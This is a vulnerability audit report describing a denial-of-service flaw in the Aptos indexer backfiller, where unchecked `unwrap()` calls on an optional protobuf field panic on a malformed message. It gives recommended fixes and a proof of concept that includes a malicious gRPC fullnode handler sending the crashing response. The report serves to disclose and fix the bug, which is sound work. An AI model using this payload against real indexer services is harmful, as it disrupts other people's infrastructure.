# Audit Report

## Title
Malicious Fullnode Can Crash Indexer Backfiller via None Response Field (Denial of Service)

## Summary
The indexer-grpc-file-store-backfiller contains multiple unsafe `unwrap()` calls on protobuf `oneof` fields that can be `None`. A malicious or compromised fullnode can send `TransactionsFromNodeResponse` messages with the `response` field unset, causing the backfiller to panic and crash. This vulnerability affects multiple indexer infrastructure components and enables a trivial Denial of Service attack.

## Finding Description

The `Processor::backfill()` function in the file-store-backfiller processes transaction data streamed from a fullnode via gRPC. The protobuf message `TransactionsFromNodeResponse` defines the `response` field as a `oneof` type, which is represented in Rust as `Option<transactions_from_node_response::Response>`. [1](#0-0) [2](#0-1) 

In proto3, a `oneof` field can be unset, meaning the Rust `Option` can be `None`. However, the backfiller code performs unsafe `unwrap()` operations without validating that the response field is present: [3](#0-2) 

The same vulnerability exists at initialization: [4](#0-3) 

**Attack Vector:**

1. The backfiller connects to a fullnode gRPC endpoint configured via `fullnode_grpc_address`
2. A malicious actor controlling that fullnode (or performing a MitM attack) sends a `TransactionsFromNodeResponse` with `response: None`
3. The `unwrap()` call panics, crashing the backfiller process
4. The attacker can repeatedly crash the backfiller to cause persistent service disruption

**Affected Components:**

The same vulnerability pattern exists in multiple indexer services:
- indexer-grpc-file-store-backfiller (line 276, 159) [5](#0-4) [6](#0-5) 

## Impact Explanation

This vulnerability qualifies as **High Severity** per the Aptos bug bounty program criteria:
- **API crashes**: The backfiller is a critical API service for indexer infrastructure
- **Service availability**: Repeated crashes prevent historical transaction data from being indexed into the file store

While the legitimate fullnode implementation always sets the response field, the protocol specification allows it to be `None`, and there is no validation to enforce this requirement on the client side. [7](#0-6) 

The impact includes:
- Disruption of indexer services that depend on the file store
- Resource waste from continuous crash-restart cycles
- Potential data gaps if crashes occur during critical backfill operations
- Affects multiple indexer components (backfiller, cache worker, v2 backfiller)

## Likelihood Explanation

**Likelihood: Medium-High**

The attack requires:
- Controlling or compromising the fullnode that the backfiller connects to, OR
- Performing a Man-in-the-Middle attack on the gRPC connection (if not using mutual TLS)

However:
- The fullnode address is configurable and may point to untrusted infrastructure
- The attack is trivial to execute once access is obtained (single malformed message)
- No authentication or authorization checks prevent malicious responses
- The backfiller runs continuously, providing persistent attack surface
- Kubernetes/orchestration systems will auto-restart the service, but repeated crashes still cause service degradation

## Recommendation

Replace all unsafe `unwrap()` calls with proper error handling using pattern matching or the `?` operator. The code should gracefully handle `None` responses by logging an error and either retrying or terminating the stream.

**Fix for line 276:**

```rust
let resp = match response.response {
    Some(r) => r,
    None => {
        tracing::error!("Received response with None response field");
        anyhow::bail!("Invalid response: response field is None");
    }
};
```

**Fix for line 159 (initialization):**

```rust
let init_frame = match grpc_stream
    .next()
    .await
    .expect("Failed to get the first frame")?
    .response
{
    Some(frame) => frame,
    None => anyhow::bail!("Init frame response field is None"),
};
```

Apply similar fixes to:
- `ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs` line 189
- `ecosystem/indexer-grpc/indexer-grpc-v2-file-store-backfiller/src/processor.rs` line 177

## Proof of Concept

```rust
// Proof of Concept: Malicious gRPC response that crashes the backfiller
use aptos_protos::internal::fullnode::v1::TransactionsFromNodeResponse;

fn create_malicious_response() -> TransactionsFromNodeResponse {
    // Create a response with None in the response field
    TransactionsFromNodeResponse {
        response: None,  // This will cause unwrap() to panic
        chain_id: 1,
    }
}

#[test]
fn test_crash_on_none_response() {
    let malicious_response = create_malicious_response();
    
    // This simulates what happens in processor.rs:276
    // The unwrap() will panic when response is None
    let result = std::panic::catch_unwind(|| {
        let _resp = malicious_response.response.unwrap();
    });
    
    assert!(result.is_err(), "Expected panic on None response");
}
```

**To exploit in practice:**

1. Set up a malicious gRPC server implementing `FullnodeData` service
2. Configure the backfiller's `fullnode_grpc_address` to point to the malicious server
3. In the `GetTransactionsFromNode` RPC handler, send responses with `response: None`:

```rust
// Malicious fullnode handler
async fn get_transactions_from_node(
    &self,
    _request: Request<GetTransactionsFromNodeRequest>,
) -> Result<Response<Self::GetTransactionsFromNodeStream>, Status> {
    let (tx, rx) = mpsc::channel(1);
    
    tokio::spawn(async move {
        // Send malicious response with None
        let malicious = TransactionsFromNodeResponse {
            response: None,
            chain_id: 1,
        };
        let _ = tx.send(Ok(malicious)).await;
    });
    
    Ok(Response::new(Box::pin(ReceiverStream::new(rx))))
}
```

The backfiller will panic immediately upon receiving this response, demonstrating the vulnerability.

## Notes

This vulnerability demonstrates a common pattern of unsafe unwrap usage in protobuf message handling where the protocol specification allows optional fields but the implementation assumes they are always present. The issue is particularly concerning because it affects multiple critical indexer infrastructure components and the exploit is trivial for anyone controlling the configured fullnode endpoint.

### Citations

**File:** protos/proto/aptos/internal/fullnode/v1/fullnode_data.proto (L47-54)
```text
message TransactionsFromNodeResponse {
  oneof response {
    StreamStatus status = 1;
    TransactionsOutput data = 2;
  }
  // Making sure that all the responses include a chain id
  uint32 chain_id = 3;
}
```

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L78-85)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct TransactionsFromNodeResponse {
    /// Making sure that all the responses include a chain id
    #[prost(uint32, tag="3")]
    pub chain_id: u32,
    #[prost(oneof="transactions_from_node_response::Response", tags="1, 2")]
    pub response: ::core::option::Option<transactions_from_node_response::Response>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L154-159)
```rust
        let init_frame = grpc_stream
            .next()
            .await
            .expect("Failed to get the first frame")?
            .response
            .unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-file-store-backfiller/src/processor.rs (L276-276)
```rust
            let resp = response.response.unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L189-189)
```rust
    match response.response.unwrap() {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-v2-file-store-backfiller/src/processor.rs (L177-177)
```rust
                                    match r.response.unwrap() {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L187-194)
```rust
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
```
